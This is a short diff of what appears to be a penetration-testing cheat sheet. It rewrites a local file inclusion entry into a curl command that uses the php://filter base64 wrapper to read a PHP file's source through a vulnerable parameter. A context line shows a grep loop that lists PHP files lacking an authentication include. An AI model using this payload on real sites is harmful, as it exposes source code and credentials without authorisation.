@@ -79,5 +79,5 @@ for f in *.php; do grep "/include/auth.php" $f || echo $f; done |grep -v include
 
 ## php wrapper lfi
 ```
-php://filter/read=convert.base64-encode/resource=lfi.php
+curl <url>?<param>=php://filter/read=convert.base64-encode/resource=<file>.php
 ```
